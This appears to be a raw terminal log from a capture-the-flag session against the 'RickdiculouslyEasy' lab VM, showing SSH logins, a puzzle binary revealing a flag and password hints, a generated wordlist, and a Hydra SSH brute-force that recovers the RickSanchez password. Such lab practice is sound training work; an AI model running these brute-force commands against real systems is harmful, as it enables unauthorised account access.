+debug1: Authenticating to 192.168.56.103:22222 as 'Summer'
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: curve25519-sha256
+debug1: kex: host key algorithm: ssh-ed25519
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: SSH2_MSG_KEX_ECDH_REPLY received
+debug1: Server host key: ssh-ed25519 SHA256:RD+qmhxymhbL8Ul9bgsqlDNHrMGfOZAR77D3nqLNwTA
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: Host '[192.168.56.103]:22222' is known and matches the ED25519 host key.
+debug1: Found key in /root/.ssh/known_hosts:1
+debug1: rekey out after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey in after 134217728 blocks
+debug1: Will attempt key: /root/.ssh/id_rsa 
+debug1: Will attempt key: /root/.ssh/id_ecdsa 
+debug1: Will attempt key: /root/.ssh/id_ecdsa_sk 
+debug1: Will attempt key: /root/.ssh/id_ed25519 
+debug1: Will attempt key: /root/.ssh/id_ed25519_sk 
+debug1: Will attempt key: /root/.ssh/id_xmss 
+debug1: Will attempt key: /root/.ssh/id_dsa 
+debug1: SSH2_MSG_EXT_INFO received
+debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,null>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password
+debug1: Next authentication method: gssapi-with-mic
+debug1: No credentials were supplied, or the credentials were unavailable or inaccessible
+No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_0)
+
+
+debug1: No credentials were supplied, or the credentials were unavailable or inaccessible
+No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_0)
+
+
+debug1: Unspecified GSS failure.  Minor code may provide more information
+No such file or directory
+
+
+debug1: Next authentication method: publickey
+debug1: Trying private key: /root/.ssh/id_rsa
+debug1: Trying private key: /root/.ssh/id_ecdsa
+debug1: Trying private key: /root/.ssh/id_ecdsa_sk
+debug1: Trying private key: /root/.ssh/id_ed25519
+debug1: Trying private key: /root/.ssh/id_ed25519_sk
+debug1: Trying private key: /root/.ssh/id_xmss
+debug1: Trying private key: /root/.ssh/id_dsa
+debug1: Next authentication method: password
+Summer@192.168.56.103's password: 
+Authenticated to 192.168.56.103 ([192.168.56.103]:22222) using "password".
+debug1: channel 0: new session [client-session] (inactive timeout: 0)
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: pledge: filesystem
+debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
+debug1: client_input_hostkeys: searching /root/.ssh/known_hosts for [192.168.56.103]:22222 / (none)
+debug1: client_input_hostkeys: searching /root/.ssh/known_hosts2 for [192.168.56.103]:22222 / (none)
+debug1: client_input_hostkeys: hostkeys file /root/.ssh/known_hosts2 does not exist
+debug1: Sending environment.
+debug1: channel 0: setting env LANG = "en_US.UTF-8"
+debug1: client_global_hostkeys_prove_confirm: server used untrusted RSA signature algorithm ssh-rsa for key 0, disregarding
+debug1: update_known_hosts: known hosts file /root/.ssh/known_hosts2 does not exist
+debug1: pledge: fork
+Last login: Fri Oct 27 18:38:44 2023 from 192.168.56.104
+[Summer@localhost ~]$ ls
+FLAG.txt
+[Summer@localhost ~]$ cd ..
+[Summer@localhost home]$ ls
+Morty  RickSanchez  Summer
+[Summer@localhost home]$ cd RickSanchez
+[Summer@localhost RickSanchez]$ ls
+RICKS_SAFE  ThisDoesntContainAnyFlags
+[Summer@localhost RickSanchez]$ cd RICKS_SAFE
+[Summer@localhost RICKS_SAFE]$ ls
+safe
+[Summer@localhost RICKS_SAFE]$ cp safe /tmp/safe
+[Summer@localhost RICKS_SAFE]$ ls
+safe
+[Summer@localhost RICKS_SAFE]$ cd ..
+[Summer@localhost RickSanchez]$ cd ..
+[Summer@localhost home]$ ls
+Morty  RickSanchez  Summer
+[Summer@localhost home]$ cd Summer
+[Summer@localhost ~]$ ls
+FLAG.txt
+[Summer@localhost ~]$ cd ..
+[Summer@localhost home]$ cd RickSanchez
+[Summer@localhost RickSanchez]$ ls
+RICKS_SAFE  ThisDoesntContainAnyFlags
+[Summer@localhost RickSanchez]$ cd RICKS_SAFE
+[Summer@localhost RICKS_SAFE]$ ls
+safe
+[Summer@localhost RICKS_SAFE]$ cd ..
+[Summer@localhost RickSanchez]$ cd ..
+[Summer@localhost home]$ cd ..
+[Summer@localhost /]$ ls
+bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+[Summer@localhost /]$ cd tmp
+[Summer@localhost tmp]$ ls
+safe  systemd-private-ff86315f2cdd4832b76d5cc6840c429a-chronyd.service-eN0fpM  systemd-private-ff86315f2cdd4832b76d5cc6840c429a-httpd.service-u7Cl1R
+[Summer@localhost tmp]$ ./safe
+Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
+[Summer@localhost tmp]$ ls
+safe  systemd-private-ff86315f2cdd4832b76d5cc6840c429a-chronyd.service-eN0fpM  systemd-private-ff86315f2cdd4832b76d5cc6840c429a-httpd.service-u7Cl1R
+[Summer@localhost tmp]$ cat safe
+                         _
+                        | \
+                        | |
+                        | |
+   |\                   | |
+  /, ~\                / /
+ X     `-.....-------./ /
+  ~-. ~  ~              |
+     \             /    |
+      \  /_     ___\   /
+      | /\ ~~~~~   \  |
+      | | \        || |
+      | |\ \       || )
+     (_/ (_/      ((_/
+
+[Summer@localhost tmp]$ ./safe 131333
+decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
+
+Ricks password hints:
+ (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
+Follow these clues, in order
+
+
+1 uppercase character
+1 digit
+One of the words in my old bands name.  @
+[Summer@localhost tmp]$ 
+::1                      localhost                localhost4               localhost4.localdomain4  localhost6               localhost6.localdomain6  localhost.localdomain    
+[Summer@localhost tmp]$ nano openSesame.py
+[Summer@localhost tmp]$ ls
+openSesame.py  safe  systemd-private-ff86315f2cdd4832b76d5cc6840c429a-chronyd.service-eN0fpM  systemd-private-ff86315f2cdd4832b76d5cc6840c429a-httpd.service-u7Cl1R
+[Summer@localhost tmp]$ nano openSesame.py
+[Summer@localhost tmp]$ exitdebug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+
+logout
+debug1: channel 0: free: client-session, nchannels 1
+Connection to 192.168.56.103 closed.
+Transferred: sent 8720, received 19360 bytes, in 2048.4 seconds
+Bytes per second: sent 4.3, received 9.5
+debug1: Exit status 0
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ nano openSesame.py             
+                                                                                                                                                                                                                                                                                                                                                              
+                                                                                                                                                                                                                                     
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ python openSesame.py                                         
+A0Flesh
+A0Curtains
+A1Flesh
+A1Curtains
+A2Flesh
+A2Curtains
+A3Flesh
+A3Curtains
+A4Flesh
+A4Curtains
+A5Flesh
+A5Curtains
+A6Flesh
+A6Curtains
+A7Flesh
+A7Curtains
+A8Flesh
+A8Curtains
+A9Flesh
+A9Curtains
+B0Flesh
+B0Curtains
+B1Flesh
+B1Curtains
+B2Flesh
+B2Curtains
+B3Flesh
+B3Curtains
+B4Flesh
+B4Curtains
+B5Flesh
+B5Curtains
+B6Flesh
+B6Curtains
+B7Flesh
+B7Curtains
+B8Flesh
+B8Curtains
+B9Flesh
+B9Curtains
+C0Flesh
+C0Curtains
+C1Flesh
+C1Curtains
+C2Flesh
+C2Curtains
+C3Flesh
+C3Curtains
+C4Flesh
+C4Curtains
+C5Flesh
+C5Curtains
+C6Flesh
+C6Curtains
+C7Flesh
+C7Curtains
+C8Flesh
+C8Curtains
+C9Flesh
+C9Curtains
+D0Flesh
+D0Curtains
+D1Flesh
+D1Curtains
+D2Flesh
+D2Curtains
+D3Flesh
+D3Curtains
+D4Flesh
+D4Curtains
+D5Flesh
+D5Curtains
+D6Flesh
+D6Curtains
+D7Flesh
+D7Curtains
+D8Flesh
+D8Curtains
+D9Flesh
+D9Curtains
+E0Flesh
+E0Curtains
+E1Flesh
+E1Curtains
+E2Flesh
+E2Curtains
+E3Flesh
+E3Curtains
+E4Flesh
+E4Curtains
+E5Flesh
+E5Curtains
+E6Flesh
+E6Curtains
+E7Flesh
+E7Curtains
+E8Flesh
+E8Curtains
+E9Flesh
+E9Curtains
+F0Flesh
+F0Curtains
+F1Flesh
+F1Curtains
+F2Flesh
+F2Curtains
+F3Flesh
+F3Curtains
+F4Flesh
+F4Curtains
+F5Flesh
+F5Curtains
+F6Flesh
+F6Curtains
+F7Flesh
+F7Curtains
+F8Flesh
+F8Curtains
+F9Flesh
+F9Curtains
+G0Flesh
+G0Curtains
+G1Flesh
+G1Curtains
+G2Flesh
+G2Curtains
+G3Flesh
+G3Curtains
+G4Flesh
+G4Curtains
+G5Flesh
+G5Curtains
+G6Flesh
+G6Curtains
+G7Flesh
+G7Curtains
+G8Flesh
+G8Curtains
+G9Flesh
+G9Curtains
+H0Flesh
+H0Curtains
+H1Flesh
+H1Curtains
+H2Flesh
+H2Curtains
+H3Flesh
+H3Curtains
+H4Flesh
+H4Curtains
+H5Flesh
+H5Curtains
+H6Flesh
+H6Curtains
+H7Flesh
+H7Curtains
+H8Flesh
+H8Curtains
+H9Flesh
+H9Curtains
+I0Flesh
+I0Curtains
+I1Flesh
+I1Curtains
+I2Flesh
+I2Curtains
+I3Flesh
+I3Curtains
+I4Flesh
+I4Curtains
+I5Flesh
+I5Curtains
+I6Flesh
+I6Curtains
+I7Flesh
+I7Curtains
+I8Flesh
+I8Curtains
+I9Flesh
+I9Curtains
+J0Flesh
+J0Curtains
+J1Flesh
+J1Curtains
+J2Flesh
+J2Curtains
+J3Flesh
+J3Curtains
+J4Flesh
+J4Curtains
+J5Flesh
+J5Curtains
+J6Flesh
+J6Curtains
+J7Flesh
+J7Curtains
+J8Flesh
+J8Curtains
+J9Flesh
+J9Curtains
+K0Flesh
+K0Curtains
+K1Flesh
+K1Curtains
+K2Flesh
+K2Curtains
+K3Flesh
+K3Curtains
+K4Flesh
+K4Curtains
+K5Flesh
+K5Curtains
+K6Flesh
+K6Curtains
+K7Flesh
+K7Curtains
+K8Flesh
+K8Curtains
+K9Flesh
+K9Curtains
+L0Flesh
+L0Curtains
+L1Flesh
+L1Curtains
+L2Flesh
+L2Curtains
+L3Flesh
+L3Curtains
+L4Flesh
+L4Curtains
+L5Flesh
+L5Curtains
+L6Flesh
+L6Curtains
+L7Flesh
+L7Curtains
+L8Flesh
+L8Curtains
+L9Flesh
+L9Curtains
+M0Flesh
+M0Curtains
+M1Flesh
+M1Curtains
+M2Flesh
+M2Curtains
+M3Flesh
+M3Curtains
+M4Flesh
+M4Curtains
+M5Flesh
+M5Curtains
+M6Flesh
+M6Curtains
+M7Flesh
+M7Curtains
+M8Flesh
+M8Curtains
+M9Flesh
+M9Curtains
+N0Flesh
+N0Curtains
+N1Flesh
+N1Curtains
+N2Flesh
+N2Curtains
+N3Flesh
+N3Curtains
+N4Flesh
+N4Curtains
+N5Flesh
+N5Curtains
+N6Flesh
+N6Curtains
+N7Flesh
+N7Curtains
+N8Flesh
+N8Curtains
+N9Flesh
+N9Curtains
+O0Flesh
+O0Curtains
+O1Flesh
+O1Curtains
+O2Flesh
+O2Curtains
+O3Flesh
+O3Curtains
+O4Flesh
+O4Curtains
+O5Flesh
+O5Curtains
+O6Flesh
+O6Curtains
+O7Flesh
+O7Curtains
+O8Flesh
+O8Curtains
+O9Flesh
+O9Curtains
+P0Flesh
+P0Curtains
+P1Flesh
+P1Curtains
+P2Flesh
+P2Curtains
+P3Flesh
+P3Curtains
+P4Flesh
+P4Curtains
+P5Flesh
+P5Curtains
+P6Flesh
+P6Curtains
+P7Flesh
+P7Curtains
+P8Flesh
+P8Curtains
+P9Flesh
+P9Curtains
+Q0Flesh
+Q0Curtains
+Q1Flesh
+Q1Curtains
+Q2Flesh
+Q2Curtains
+Q3Flesh
+Q3Curtains
+Q4Flesh
+Q4Curtains
+Q5Flesh
+Q5Curtains
+Q6Flesh
+Q6Curtains
+Q7Flesh
+Q7Curtains
+Q8Flesh
+Q8Curtains
+Q9Flesh
+Q9Curtains
+R0Flesh
+R0Curtains
+R1Flesh
+R1Curtains
+R2Flesh
+R2Curtains
+R3Flesh
+R3Curtains
+R4Flesh
+R4Curtains
+R5Flesh
+R5Curtains
+R6Flesh
+R6Curtains
+R7Flesh
+R7Curtains
+R8Flesh
+R8Curtains
+R9Flesh
+R9Curtains
+S0Flesh
+S0Curtains
+S1Flesh
+S1Curtains
+S2Flesh
+S2Curtains
+S3Flesh
+S3Curtains
+S4Flesh
+S4Curtains
+S5Flesh
+S5Curtains
+S6Flesh
+S6Curtains
+S7Flesh
+S7Curtains
+S8Flesh
+S8Curtains
+S9Flesh
+S9Curtains
+T0Flesh
+T0Curtains
+T1Flesh
+T1Curtains
+T2Flesh
+T2Curtains
+T3Flesh
+T3Curtains
+T4Flesh
+T4Curtains
+T5Flesh
+T5Curtains
+T6Flesh
+T6Curtains
+T7Flesh
+T7Curtains
+T8Flesh
+T8Curtains
+T9Flesh
+T9Curtains
+U0Flesh
+U0Curtains
+U1Flesh
+U1Curtains
+U2Flesh
+U2Curtains
+U3Flesh
+U3Curtains
+U4Flesh
+U4Curtains
+U5Flesh
+U5Curtains
+U6Flesh
+U6Curtains
+U7Flesh
+U7Curtains
+U8Flesh
+U8Curtains
+U9Flesh
+U9Curtains
+V0Flesh
+V0Curtains
+V1Flesh
+V1Curtains
+V2Flesh
+V2Curtains
+V3Flesh
+V3Curtains
+V4Flesh
+V4Curtains
+V5Flesh
+V5Curtains
+V6Flesh
+V6Curtains
+V7Flesh
+V7Curtains
+V8Flesh
+V8Curtains
+V9Flesh
+V9Curtains
+W0Flesh
+W0Curtains
+W1Flesh
+W1Curtains
+W2Flesh
+W2Curtains
+W3Flesh
+W3Curtains
+W4Flesh
+W4Curtains
+W5Flesh
+W5Curtains
+W6Flesh
+W6Curtains
+W7Flesh
+W7Curtains
+W8Flesh
+W8Curtains
+W9Flesh
+W9Curtains
+X0Flesh
+X0Curtains
+X1Flesh
+X1Curtains
+X2Flesh
+X2Curtains
+X3Flesh
+X3Curtains
+X4Flesh
+X4Curtains
+X5Flesh
+X5Curtains
+X6Flesh
+X6Curtains
+X7Flesh
+X7Curtains
+X8Flesh
+X8Curtains
+X9Flesh
+X9Curtains
+Y0Flesh
+Y0Curtains
+Y1Flesh
+Y1Curtains
+Y2Flesh
+Y2Curtains
+Y3Flesh
+Y3Curtains
+Y4Flesh
+Y4Curtains
+Y5Flesh
+Y5Curtains
+Y6Flesh
+Y6Curtains
+Y7Flesh
+Y7Curtains
+Y8Flesh
+Y8Curtains
+Y9Flesh
+Y9Curtains
+Z0Flesh
+Z0Curtains
+Z1Flesh
+Z1Curtains
+Z2Flesh
+Z2Curtains
+Z3Flesh
+Z3Curtains
+Z4Flesh
+Z4Curtains
+Z5Flesh
+Z5Curtains
+Z6Flesh
+Z6Curtains
+Z7Flesh
+Z7Curtains
+Z8Flesh
+Z8Curtains
+Z9Flesh
+Z9Curtains
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ nano password  
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo hydra -l RickSanchez -P password  -t4 -f -s 22222 192.168.56.103 ssh
+[sudo] password for kali: 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-27 05:32:23
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 520 login tries (l:1/p:520), ~130 tries per task
+[DATA] attacking ssh://192.168.56.103:22222/
+[STATUS] 44.00 tries/min, 44 tries in 00:01h, 476 to do in 00:11h, 4 active
+[STATUS] 34.67 tries/min, 104 tries in 00:03h, 416 to do in 00:13h, 4 active
+[STATUS] 29.14 tries/min, 204 tries in 00:07h, 316 to do in 00:11h, 4 active
+[22222][ssh] host: 192.168.56.103   login: RickSanchez   password: P7Curtains
+[STATUS] attack finished for 192.168.56.103 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-27 05:43:04
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo ssh RickSanchez@192.168.56.103 -p 22222 -v
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 22222.
+debug1: Connection established.
+debug1: identity file /root/.ssh/id_rsa type -1
+debug1: identity file /root/.ssh/id_rsa-cert type -1
+debug1: identity file /root/.ssh/id_ecdsa type -1
+debug1: identity file /root/.ssh/id_ecdsa-cert type -1
+debug1: identity file /root/.ssh/id_ecdsa_sk type -1
+debug1: identity file /root/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /root/.ssh/id_ed25519 type -1
+debug1: identity file /root/.ssh/id_ed25519-cert type -1
+debug1: identity file /root/.ssh/id_ed25519_sk type -1
+debug1: identity file /root/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /root/.ssh/id_xmss type -1
+debug1: identity file /root/.ssh/id_xmss-cert type -1
+debug1: identity file /root/.ssh/id_dsa type -1
+debug1: identity file /root/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.3p2 Debian-1
+debug1: Remote protocol version 2.0, remote software version OpenSSH_7.5
+debug1: compat_banner: match: OpenSSH_7.5 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002
+debug1: Authenticating to 192.168.56.103:22222 as 'RickSanchez'
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: curve25519-sha256
+debug1: kex: host key algorithm: ssh-ed25519
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: SSH2_MSG_KEX_ECDH_REPLY received
+debug1: Server host key: ssh-ed25519 SHA256:RD+qmhxymhbL8Ul9bgsqlDNHrMGfOZAR77D3nqLNwTA
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: Host '[192.168.56.103]:22222' is known and matches the ED25519 host key.
+debug1: Found key in /root/.ssh/known_hosts:1
+debug1: rekey out after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey in after 134217728 blocks
+debug1: Will attempt key: /root/.ssh/id_rsa 
+debug1: Will attempt key: /root/.ssh/id_ecdsa 
+debug1: Will attempt key: /root/.ssh/id_ecdsa_sk 
+debug1: Will attempt key: /root/.ssh/id_ed25519 
+debug1: Will attempt key: /root/.ssh/id_ed25519_sk 
+debug1: Will attempt key: /root/.ssh/id_xmss 
+debug1: Will attempt key: /root/.ssh/id_dsa 
+debug1: SSH2_MSG_EXT_INFO received
+debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,null>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password
+debug1: Next authentication method: gssapi-with-mic
+debug1: No credentials were supplied, or the credentials were unavailable or inaccessible
+No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_0)
+
+
+debug1: No credentials were supplied, or the credentials were unavailable or inaccessible
+No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_0)
+
+
+debug1: Unspecified GSS failure.  Minor code may provide more information
+No such file or directory
+
+
+debug1: Next authentication method: publickey
+debug1: Trying private key: /root/.ssh/id_rsa
+debug1: Trying private key: /root/.ssh/id_ecdsa
+debug1: Trying private key: /root/.ssh/id_ecdsa_sk
+debug1: Trying private key: /root/.ssh/id_ed25519
+debug1: Trying private key: /root/.ssh/id_ed25519_sk
+debug1: Trying private key: /root/.ssh/id_xmss
+debug1: Trying private key: /root/.ssh/id_dsa
+debug1: Next authentication method: password
+RickSanchez@192.168.56.103's password: 
+Authenticated to 192.168.56.103 ([192.168.56.103]:22222) using "password".
+debug1: channel 0: new session [client-session] (inactive timeout: 0)
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: pledge: filesystem
+debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
+debug1: client_input_hostkeys: searching /root/.ssh/known_hosts for [192.168.56.103]:22222 / (none)
+debug1: client_input_hostkeys: searching /root/.ssh/known_hosts2 for [192.168.56.103]:22222 / (none)
+debug1: client_input_hostkeys: hostkeys file /root/.ssh/known_hosts2 does not exist
+debug1: Sending environment.
+debug1: channel 0: setting env LANG = "en_US.UTF-8"
+debug1: client_global_hostkeys_prove_confirm: server used untrusted RSA signature algorithm ssh-rsa for key 0, disregarding
+debug1: update_known_hosts: known hosts file /root/.ssh/known_hosts2 does not exist
+debug1: pledge: fork
+Last failed login: Fri Oct 27 20:43:03 AEDT 2023 from 192.168.56.104 on ssh:notty
+There were 375 failed login attempts since the last successful login.
+Last login: Thu Sep 21 09:45:24 2017
+[RickSanchez@localhost ~]$ ls
+RICKS_SAFE  ThisDoesntContainAnyFlags
+[RickSanchez@localhost ~]$ cd RICK_SAFE
+-bash: cd: RICK_SAFE: No such file or directory
+
+[RickSanchez@localhost ~]$ ssh RickShancez@192.168.56.103 -p 22222
+The authenticity of host '[192.168.56.103]:22222 ([192.168.56.103]:22222)' can't be established.
+ECDSA key fingerprint is SHA256:rP4CX/V9xNZay9srIUBRq2BFQTnmxUO9cs1F3E9yzg0.
+ECDSA key fingerprint is MD5:20:67:ed:d9:39:88:f9:ed:0d:af:8c:8e:8a:45:6e:0e.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '[192.168.56.103]:22222' (ECDSA) to the list of known hosts.
+RickShancez@192.168.56.103's password: 
+Permission denied, please try again.
+RickShancez@192.168.56.103's password: 
+Permission denied, please try again.
+RickShancez@192.168.56.103's password: 
+Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
+[RickSanchez@localhost ~]$ ssh RickShancez@192.168.56.103 -p 22222
+RickShancez@192.168.56.103's password: 
+Permission denied, please try again.
+RickShancez@192.168.56.103's password: 
+Permission denied, please try again.
+RickShancez@192.168.56.103's password: 
+Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
+[RickSanchez@localhost ~]$ ssh RickShancez@192.168.56.103 -p 22222
+RickShancez@192.168.56.103's password: 
+Permission denied, please try again.
+RickShancez@192.168.56.103's password: 
+Permission denied, please try again.
+RickShancez@192.168.56.103's password: 
+Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
+[RickSanchez@localhost ~]$ ssh RickShancez@192.168.56.103 -p 22222
+RickShancez@192.168.56.103's password: 
+Permission denied, please try again.
+RickShancez@192.168.56.103's password: 
+Permission denied, please try again.
+RickShancez@192.168.56.103's password: 
+
+[RickSanchez@localhost ~]$ ^C
+[RickSanchez@localhost ~]$ exit
+logout
+debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+debug1: channel 0: free: client-session, nchannels 1
+Connection to 192.168.56.103 closed.
+Transferred: sent 8056, received 18204 bytes, in 441.8 seconds
+Bytes per second: sent 18.2, received 41.2
+debug1: Exit status 130
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo ssh RickSanchez@192.168.56.103 -p 22222 -v
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 22222.
+debug1: Connection established.
+debug1: identity file /root/.ssh/id_rsa type -1
+debug1: identity file /root/.ssh/id_rsa-cert type -1
+debug1: identity file /root/.ssh/id_ecdsa type -1
+debug1: identity file /root/.ssh/id_ecdsa-cert type -1
+debug1: identity file /root/.ssh/id_ecdsa_sk type -1
+debug1: identity file /root/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /root/.ssh/id_ed25519 type -1
+debug1: identity file /root/.ssh/id_ed25519-cert type -1
+debug1: identity file /root/.ssh/id_ed25519_sk type -1
+debug1: identity file /root/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /root/.ssh/id_xmss type -1
+debug1: identity file /root/.ssh/id_xmss-cert type -1
+debug1: identity file /root/.ssh/id_dsa type -1
+debug1: identity file /root/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.3p2 Debian-1
+debug1: Remote protocol version 2.0, remote software version OpenSSH_7.5
+debug1: compat_banner: match: OpenSSH_7.5 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002
+debug1: Authenticating to 192.168.56.103:22222 as 'RickSanchez'
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: curve25519-sha256
+debug1: kex: host key algorithm: ssh-ed25519
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: SSH2_MSG_KEX_ECDH_REPLY received
+debug1: Server host key: ssh-ed25519 SHA256:RD+qmhxymhbL8Ul9bgsqlDNHrMGfOZAR77D3nqLNwTA
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: Host '[192.168.56.103]:22222' is known and matches the ED25519 host key.
+debug1: Found key in /root/.ssh/known_hosts:1
+debug1: rekey out after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey in after 134217728 blocks
+debug1: Will attempt key: /root/.ssh/id_rsa 
+debug1: Will attempt key: /root/.ssh/id_ecdsa 
+debug1: Will attempt key: /root/.ssh/id_ecdsa_sk 
+debug1: Will attempt key: /root/.ssh/id_ed25519 
+debug1: Will attempt key: /root/.ssh/id_ed25519_sk 
+debug1: Will attempt key: /root/.ssh/id_xmss 
+debug1: Will attempt key: /root/.ssh/id_dsa 
+debug1: SSH2_MSG_EXT_INFO received
+debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,null>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password
+debug1: Next authentication method: gssapi-with-mic
